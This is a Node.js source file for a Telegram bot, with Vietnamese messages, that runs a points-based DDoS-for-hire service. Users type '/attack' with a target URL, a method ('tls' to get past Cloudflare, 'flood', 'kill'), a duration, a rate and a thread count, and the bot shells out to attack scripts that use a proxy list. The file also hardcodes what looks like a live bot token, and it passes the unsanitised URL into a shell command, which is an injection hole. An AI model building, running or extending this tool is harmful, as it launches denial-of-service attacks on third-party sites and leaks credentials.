const TelegramBot = require("node-telegram-bot-api");
const Database = require("better-sqlite3");
const si = require("systeminformation");
const token = "7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc";
const bot = new TelegramBot(token, { polling: true });
const admins = [6601930239, 1848131455];
const subAdmins = [7245377580];
const groupId = -1002370415846;
const methods = ["tls", "flood", "kill"];
const db = Database("bot.db");

db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
CREATE TABLE IF NOT EXISTS slots (userId INTEGER, url TEXT, method TEXT, endTime INTEGER, fullName TEXT, PRIMARY KEY(userId, url, method));
CREATE TABLE IF NOT EXISTS users (userId INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, lastCheckin TEXT, attacksToday INTEGER DEFAULT 0, lastAttackDate TEXT);`);

const getSetting = db.prepare("SELECT value FROM settings WHERE key=?");
const setSetting = db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)");
const getAllBlacklist = db.prepare("SELECT keyword FROM blacklist");
const addBlacklist = db.prepare("INSERT OR IGNORE INTO blacklist (keyword) VALUES (?)");
const removeBlacklist = db.prepare("DELETE FROM blacklist WHERE keyword=?");
const getAllSlots = db.prepare("SELECT * FROM slots");
const addSlot = db.prepare("INSERT INTO slots (userId, url, method, endTime, fullName) VALUES (?, ?, ?, ?, ?)");
const removeSlot = db.prepare("DELETE FROM slots WHERE userId=? AND url=? AND method=?");
const removeExpiredSlots = db.prepare("DELETE FROM slots WHERE endTime <= ?");
const getUser = db.prepare("SELECT * FROM users WHERE userId=?");
const addUser = db.prepare("INSERT OR IGNORE INTO users (userId, points, lastCheckin, attacksToday, lastAttackDate) VALUES (?, 0, '', 0, '')");
const updateUserPoints = db.prepare("UPDATE users SET points=? WHERE userId=?");
const updateUserCheckin = db.prepare("UPDATE users SET lastCheckin=? WHERE userId=?");
const updateUserAttacks = db.prepare("UPDATE users SET attacksToday=?, lastAttackDate=? WHERE userId=?");

if (!getSetting.get("maintenance")) setSetting.run("maintenance", "false");
if (!getSetting.get("activeSlots")) setSetting.run("activeSlots", "0");
setSetting.run("activeSlots", "0");

let maintenance = getSetting.get("maintenance").value === "true";
let blacklist = getAllBlacklist.all().map(r => r.keyword);
let activeSlots = parseInt(getSetting.get("activeSlots").value);
const maxSlots = 1;
let lastAttackTime = 0;
const cooldown = 60000;

function syncSlotsFromDb() {
  removeExpiredSlots.run(Math.floor(Date.now() / 1000));
  activeSlots = getAllSlots.all().length;
  setSetting.run("activeSlots", activeSlots.toString());
}
syncSlotsFromDb();

function getFullName(user) {
  let name = user.first_name || "";
  if (user.last_name) name += " " + user.last_name;
  return name || user.username || "Unknown";
}

function getTodayString() {
  return new Date().toISOString().split('T')[0];
}

function isAdmin(userId) {
  return admins.includes(userId);
}

function isSubAdmin(userId) {
  return subAdmins.includes(userId);
}

function resetDailyAttacks() {
  const today = getTodayString();
  const users = db.prepare("SELECT userId, lastAttackDate FROM users").all();
  users.forEach(user => {
    if (user.lastAttackDate !== today) {
      updateUserAttacks.run(0, today, user.userId);
    }
  });
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  addUser.run(userId);
  bot.sendMessage(chatId, `*📜 Lệnh của Bot:*\n• /methods -> Xem danh sách methods\n• /attack [url] [method] [time] [-r rate] [-t threads]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Bật hoặc tắt chức năng bảo trì Bot (admin only)\n• /ongoing -> Xem slot đang hoạt động\n• /system -> Xem thông tin hệ thống\n• /daily -> Điểm danh nhận 300 điểm\n• /balance -> Xem số điểm hiện có`, { parse_mode: "Markdown" });
});

bot.onText(/\/methods/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• kill -> Mạnh nhưng no bypass`, { parse_mode: "Markdown" });
});

bot.onText(/\/daily/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  
  if (isAdmin(userId) || isSubAdmin(userId)) {
    bot.sendMessage(chatId, "❌ Admin và SubAdmin không cần điểm danh!", { parse_mode: "Markdown" });
    return;
  }
  
  addUser.run(userId);
  const user = getUser.get(userId);
  const today = getTodayString();
  if (user.lastCheckin === today) {
    bot.sendMessage(chatId, "❌ Bạn đã điểm danh hôm nay rồi!", { parse_mode: "Markdown" });
    return;
  }
  const newPoints = user.points + 300;
  updateUserPoints.run(newPoints, userId);
  updateUserCheckin.run(today, userId);
  bot.sendMessage(chatId, `Đã cộng 300 điểm cho bạn.\nSố điểm hiện tại: ${newPoints}`, { parse_mode: "Markdown" });
});

bot.onText(/\/balance/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  addUser.run(userId);
  const user = getUser.get(userId);
  bot.sendMessage(chatId, `💰 Số điểm của bạn: ${user.points}`, { parse_mode: "Markdown" });
});

bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAdmin(userId)) return bot.sendMessage(chatId, "Bạn không có quyền sử dụng lệnh này.");
  const bl = getAllBlacklist.all().map(r => r.keyword);
  bot.sendMessage(chatId, `📝 Blacklist hiện tại:\n${bl.length ? bl.map(k=>`- \`${k}\``).join("\n") : "Không có keyword nào."}`, { parse_mode: "Markdown" });
});

bot.onText(/\/blacklist (add|remove) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAdmin(userId)) return bot.sendMessage(chatId, "Bạn không có quyền sử dụng lệnh này.");
  const action = match[1];
  const keyword = match[2].trim();
  if (action === "add") {
    if (!blacklist.includes(keyword)) {
      blacklist.push(keyword);
      addBlacklist.run(keyword);
      bot.sendMessage(chatId, `✅ Đã thêm \`${keyword}\` vào blacklist`, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, `Từ khóa \`${keyword}\` đã có trong blacklist.`, { parse_mode: "Markdown" });
    }
  } else if (action === "remove") {
    if (blacklist.includes(keyword)) {
      blacklist = blacklist.filter(k => k !== keyword);
      removeBlacklist.run(keyword);
      bot.sendMessage(chatId, `🚫 Đã xoá \`${keyword}\` khỏi blacklist`, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, `Từ khóa \`${keyword}\` không có trong blacklist.`, { parse_mode: "Markdown" });
    }
  }
});

bot.onText(/\/maintenance/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAdmin(userId)) return bot.sendMessage(chatId, "Bạn không có quyền sử dụng lệnh này.");
  maintenance = !maintenance;
  setSetting.run("maintenance", maintenance ? "true" : "false");
  bot.sendMessage(chatId, `🛠️ Bảo trì: *${maintenance ? "Bật" : "Tắt"}*`, { parse_mode: "Markdown" });
});

bot.onText(/\/ongoing/, (msg) => {
  syncSlotsFromDb();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  const now = Math.floor(Date.now()/1000);
  const slots = getAllSlots.all();
  if (!slots.length) {
    bot.sendMessage(chatId, `Hiện không có slot nào đang hoạt động.\nSố slot trống: ${maxSlots}/${maxSlots}`, { parse_mode: "Markdown" });
    return;
  }
  let text = `*Ongoing Attacks:*\n`;
  slots.forEach((s, i) => {
    let timeLeft = s.endTime - now;
    timeLeft = timeLeft > 0 ? timeLeft : 0;
    text += `\n${i+1}. 👤 User: \`${s.fullName}\`\n   🔗 URL: \`${s.url}\`\n   ⚙️ Method: \`${s.method}\`\n   ⏳ Còn lại: \`${timeLeft}s\``;
  });
  text += `\n\nSlot trống: ${maxSlots-slots.length}/${maxSlots}`;
  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
});

bot.onText(/\/attack$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  bot.sendMessage(chatId, "Cú pháp: /attack [url] [method] [time] [-r rate] [-t threads]\nVD: /attack https://abc.com method -r 64 -t 8\nLưu ý: Min time 10s, max time 120s. Gói free không custom được rate(-r) và thread(-t), gõ /methods để xem method. Mỗi lần attack trừ 100 điểm.", { parse_mode: "Markdown" });
});

bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  
  if (maintenance && !isAdmin(userId)) {
    bot.sendMessage(chatId, "🛠️ Bot đang bảo trì, vui lòng thử lại sau.", { parse_mode: "Markdown" });
    return;
  }
  
  addUser.run(userId);
  const user = getUser.get(userId);
  const today = getTodayString();
  
  resetDailyAttacks();
  
  const url = match[1];
  const method = match[2];
  let time = parseInt(match[3]);
  let rate = match[4] ? parseInt(match[4]) : 17;
  let threads = match[5] ? parseInt(match[5]) : 5;
  
  if (!methods.includes(method)) {
    bot.sendMessage(chatId, "🚫 Method không hợp lệ.", { parse_mode: "Markdown" });
    return;
  }
  
  if (blacklist.some(k => url.includes(k))) {
    bot.sendMessage(chatId, "🚫 URL này nằm trong blacklist.", { parse_mode: "Markdown" });
    return;
  }
  
  if (time < 10) {
    bot.sendMessage(chatId, "🚫 Thời gian tối thiểu là 10s.", { parse_mode: "Markdown" });
    return;
  }
  
  if (isAdmin(userId)) {
    
  } else if (isSubAdmin(userId)) {
    if (time > 260) time = 260;
    if (user.lastAttackDate === today && user.attacksToday >= 10) {
      bot.sendMessage(chatId, "🚫 Bạn đã sử dụng hết 10 lượt attack trong ngày.", { parse_mode: "Markdown" });
      return;
    }
    rate = 17;
    threads = 5;
  } else {
    if (time > 60) time = 60;
    if (user.points < 100) {
      bot.sendMessage(chatId, "❌ Bạn không đủ điểm để thực hiện attack. Cần ít nhất 100 điểm.", { parse_mode: "Markdown" });
      return;
    }
    rate = 17;
    threads = 5;
  }
  
  syncSlotsFromDb();
  if (activeSlots >= maxSlots) {
    bot.sendMessage(chatId, "🚫 Hiện không còn slot trống, vui lòng thử lại sau.", { parse_mode: "Markdown" });
    return;
  }
  
  const now = Date.now();
  if (now - lastAttackTime < cooldown) {
    const waitTime = Math.ceil((cooldown - (now - lastAttackTime)) / 1000);
    bot.sendMessage(chatId, `⏳ Vui lòng đợi ${waitTime}s trước khi gửi attack tiếp theo.`, { parse_mode: "Markdown" });
    return;
  }
  
  if (!isAdmin(userId) && !isSubAdmin(userId)) {
    updateUserPoints.run(user.points - 100, userId);
  }
  
  if (isSubAdmin(userId)) {
    const newAttackCount = user.lastAttackDate === today ? user.attacksToday + 1 : 1;
    updateUserAttacks.run(newAttackCount, today, userId);
  }
  
  const endTime = Math.floor(now / 1000) + time;
  const fullName = getFullName(msg.from);
  addSlot.run(userId, url, method, endTime, fullName);
  activeSlots++;
  setSetting.run("activeSlots", activeSlots.toString());
  lastAttackTime = now;
  
  let pointsText = "";
  if (!isAdmin(userId) && !isSubAdmin(userId)) {
    pointsText = `\n*Điểm còn lại:* \`${user.points - 100}\``;
  } else if (isSubAdmin(userId)) {
    const newAttackCount = user.lastAttackDate === today ? user.attacksToday + 1 : 1;
    pointsText = `\n*Lượt attack còn lại hôm nay:* \`${10 - newAttackCount}\``;
  }
  
  bot.sendMessage(chatId, `*🔫 Attack sent!*\n\n*URL:* \`${url}\`\n*Method:* \`${method}\`\n*Thời gian:* \`${time}s\`\n*Rate:* \`${rate}\`\n*Threads:* \`${threads}\`${pointsText}`, { parse_mode: "Markdown" });
  
  const { exec } = require("child_process");
  exec(`node ${method}.js ${url} ${time} ${rate} ${threads} proxy.txt`, (error, stdout, stderr) => {
    removeSlot.run(userId, url, method);
    syncSlotsFromDb();
    bot.sendMessage(groupId, `Đã có slot mới. ✅\nSố slot hiện tại: ${activeSlots}/${maxSlots}. 🔢`, { parse_mode: "Markdown" });
    if (error) {
      bot.sendMessage(chatId, `🚫 Lỗi: \`${error.message}\``, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, `✅ Hoàn thành!\n\`\`\`\n${stdout}\n\`\`\``, { parse_mode: "Markdown" });
    }
  });
});

bot.onText(/\/system/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  if (!isAdmin(userId)) {
    bot.sendMessage(chatId, "Bạn không có quyền sử dụng lệnh này.");
    return;
  }
  try {
    const cpu = await si.cpu();
    const osInfo = await si.osInfo();
    const mem = await si.mem();
    const disk = await si.fsSize();
    let message = `*System Information:*\n`;
    message += `\n*CPU:* ${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores)`;
    message += `\n*OS Name:* ${osInfo.distro}`; 
    message += `\n*Total RAM:* ${(mem.total / (1024 ** 3)).toFixed(2)} GB`;
    message += `\n*Free RAM:* ${(mem.free / (1024 ** 3)).toFixed(2)} GB`;
    message += `\n*Used Disk:* ${(disk[0].used / (1024 ** 3)).toFixed(2)} GB`;
    message += `\n*Total Disk:* ${(disk[0].size / (1024 ** 3)).toFixed(2)} GB`;
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    bot.sendMessage(chatId, `Error getting system info: ${e.message}`);
  }
});

function isAllowed(chatId, userId) {
  if (admins.includes(userId) || subAdmins.includes(userId)) return true;
  if (chatId !== groupId) return false;
  return true;
}
